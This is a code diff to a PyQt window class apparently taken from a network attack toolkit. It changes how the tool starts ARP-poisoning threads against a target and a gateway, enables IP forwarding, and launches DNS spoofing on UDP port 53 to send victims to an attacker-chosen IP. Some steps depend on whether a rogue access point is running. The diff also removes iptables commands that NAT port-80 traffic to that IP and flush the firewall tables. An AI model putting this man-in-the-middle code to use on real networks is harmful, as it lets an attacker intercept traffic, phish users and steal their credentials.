@@ -51,20 +51,21 @@ class frm_Arp_Poison(QWidget):
         self.GUI()
 
     def closeEvent(self, event):
-        if (len(self.ThreadDirc['Arp_posion']) != 0):
-            reply = QMessageBox.question(self, 'About Exit',
-            'Are you sure to close ArpPosion?', QMessageBox.Yes |
-                QMessageBox.No, QMessageBox.No)
-            if reply == QMessageBox.Yes:
-                event.accept()
-                if getuid() == 0:
-                    try:
-                        for i in self.ThreadDirc['Arp_posion']:
-                            i.stop(),i.join()
-                    except:pass
-                    self.deleteLater()
-                    return
-            event.ignore()
+        reply = QMessageBox.question(self, 'About Exit',
+        'Are you sure to close ArpPosion?', QMessageBox.Yes |
+            QMessageBox.No, QMessageBox.No)
+        if reply == QMessageBox.Yes:
+            event.accept()
+            if (len(self.ThreadDirc['Arp_posion']) != 0):
+                try:
+                    for i in self.ThreadDirc['Arp_posion']:
+                        i.stop(),i.join()
+                except:pass
+                if self.configure.xmlSettings('statusAP','value',None,False) == 'False':
+                    Refactor.set_ip_forward(0)
+                self.deleteLater()
+                return
+        event.ignore()
 
     def loadtheme(self,theme):
         sshFile=("Core/%s.qss"%(theme))
@@ -224,6 +225,8 @@ class frm_Arp_Poison(QWidget):
         iface = str(self.ComboIface.currentText())
         mac = Refactor.getHwAddr(iface)
         ip = Refactor.get_Ipaddr(iface)
+        if self.configure.xmlSettings('statusAP','value',None,False) == 'True':
+            self.txt_gateway.setText('10.0.0.1')
         self.txt_mac.setText(mac)
         self.txt_redirect.setText(ip)
 
@@ -251,8 +254,6 @@ class frm_Arp_Poison(QWidget):
         chdir(self.owd)
         self.StatusMonitor(False,'stas_arp')
         self.StatusMonitor(False,'stas_phishing')
-        self.conf_attack(False)
-        Refactor.set_ip_forward(0)
 
     @pyqtSlot(QModelIndex)
     def check_options(self,index):
@@ -277,47 +278,32 @@ class frm_Arp_Poison(QWidget):
             if (len(self.txt_target.text()) and len(self.txt_gateway.text())) and len(self.txt_mac.text()) != 0:
                 if len(self.txt_redirect.text()) != 0:
                     self.StatusMonitor(True,'stas_arp')
-                    Refactor.set_ip_forward(1)
+                    if self.configure.xmlSettings('statusAP','value',None,False) == 'False':
+                        Refactor.set_ip_forward(1)
+                        arp_gateway = ThARP_posion(str(self.txt_gateway.text()),str(self.txt_target.text()),
+                        get_if_hwaddr(str(self.ComboIface.currentText())))
+                        arp_gateway.setObjectName('Arp Posion:: [gateway]')
+                        self.ThreadDirc['Arp_posion'].append(arp_gateway)
+                        arp_gateway.start()
 
-                    arp_gateway = ThARP_posion(str(self.txt_gateway.text()),str(self.txt_target.text()),
-                    get_if_hwaddr(str(self.ComboIface.currentText())))
-                    arp_gateway.setObjectName('Arp Posion:: [gateway]')
-                    self.ThreadDirc['Arp_posion'].append(arp_gateway)
-                    arp_gateway.start()
+                        arp_target = ThARP_posion(str(self.txt_target.text()),
+                        str(self.txt_gateway.text()),
+                        str(self.txt_mac.text()))
+                        self.connect(arp_target,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
+                        arp_target.setObjectName('Arp::Posion => [target]')
+                        self.ThreadDirc['Arp_posion'].append(arp_target)
+                        arp_target.start()
 
-                    arp_target = ThARP_posion(str(self.txt_target.text()),
-                    str(self.txt_gateway.text()),
-                    str(self.txt_mac.text()))
-                    self.connect(arp_target,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
-                    arp_target.setObjectName('Arp::Posion => [target]')
-                    self.ThreadDirc['Arp_posion'].append(arp_target)
-                    arp_target.start()
-
-                    self.conf_attack(True)
                     redirectPackets = ThSpoofAttack('',
                     str(self.ComboIface.currentText()),'udp port 53',True,str(self.txt_redirect.text()))
                     self.connect(redirectPackets,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
+                    if self.configure.xmlSettings('statusAP','value',None,False) == 'False':redirectPackets.redirection()
+                    else:redirectPackets.redirectionAP()
                     redirectPackets.setObjectName('Packets Spoof')
                     self.ThreadDirc['Arp_posion'].append(redirectPackets)
                     redirectPackets.start()
-
-    def conf_attack(self,bool_conf):
-        if bool_conf:
-            self.ip = str(self.txt_redirect.text())
-            if len(self.ip) != 0:
-                system('iptables -t nat --flush')
-                system('iptables -A FORWARD --in-interface '+str(self.txt_gateway.text())+' -j ACCEPT')
-                system('iptables -t nat --append POSTROUTING --out-interface ' +str(self.ComboIface.currentText()) +' -j MASQUERADE')
-                system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.ip)
-            else:
+                    return
                 QMessageBox.information(self,'Error Redirect IP','Redirect IP not found')
-        else:
-            nano = [
-                'iptables --flush',
-                'iptables --table nat --flush' ,\
-                'iptables --delete-chain', 'iptables --table nat --delete-chain'
-                    ]
-            for delete in nano: popen(delete)
 
     def Start_scan(self):
         self.StatusMonitor(True,'stas_scan')
